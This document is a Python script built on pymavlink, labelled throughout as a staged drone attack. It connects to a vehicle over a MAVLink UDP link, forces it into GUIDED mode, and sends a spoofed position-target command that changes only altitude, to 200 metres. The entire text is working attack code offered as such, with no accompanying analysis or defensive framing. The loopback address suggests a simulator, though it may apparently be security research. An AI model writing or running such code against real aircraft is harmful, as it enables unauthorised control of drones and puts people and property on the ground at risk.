import time
import math # <-- Add this import
from pymavlink import mavutil

# --- Configuration ---
CONNECTION_STRING = 'udp:127.0.0.1:14550'
ATTACK_ALT_ONLY = 200   # Example Altitude for the spoof
WAIT_BEFORE_ATTACK = 5
GUIDED_MODE_COPTER = 4


# --- Main Attack Logic ---
print(f"Connecting to vehicle on: {CONNECTION_STRING}")
try:
    master = mavutil.mavlink_connection(CONNECTION_STRING)
except Exception as e:
    print(f"Failed to connect: {e}")
    exit()

print("Waiting for heartbeat...")
master.wait_heartbeat()
print(f"Heartbeat from system (system {master.target_system} component {master.target_component})")

print(f"Waiting {WAIT_BEFORE_ATTACK} seconds before launching attack...")
time.sleep(WAIT_BEFORE_ATTACK)

# --- STAGE 1: Force drone into GUIDED mode ---
print("\n!!! ATTACK STAGE 1: Forcing vehicle into GUIDED mode !!!")
master.mav.command_long_send(
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,
    1,  # Custom mode
    GUIDED_MODE_COPTER,
    0, 0, 0, 0, 0  # Unused parameters
)

# --- NEW: Loop and verify the mode change from HEARTBEAT messages ---
print("Waiting for mode change confirmation...")
mode_changed = False
for _ in range(10): # Try for a few seconds
    msg = master.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
    if msg and msg.custom_mode == GUIDED_MODE_COPTER:
        print("Mode change to GUIDED successful!")
        mode_changed = True
        break
    time.sleep(0.5)

if not mode_changed:
    print("Mode change failed or timed out. Aborting attack.")
    exit()

time.sleep(1) # Give the vehicle a moment to stabilize in the new mode

# --- STAGE 2:
print(f"\n!!! ATTACK STAGE 2: Sending ALTITUDE-ONLY spoof command (Alt: {ATTACK_ALT_ONLY}m) !!!")
master.mav.set_position_target_global_int_send(
    0, # time_boot_ms (not used)
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT, # frame
    # --- THIS IS THE KEY CHANGE ---
    0b0000111111111011, # type_mask (Decimal: 4091). IGNORE_LAT, IGNORE_LON
    # --- THESE VALUES ARE NOW IGNORED ---
    0, # lat_int (ignored)
    0, # lon_int (ignored)
    ATTACK_ALT_ONLY, # alt (THIS IS USED)
    0, 0, 0, # velocity (ignored)
    0, 0, 0, # acceleration (ignored)
    0, 0)    # yaw, yaw_rate (ignored)

print(f"Attack commands sent! Drone should be flying to ALT: {ATTACK_ALT_ONLY}m")

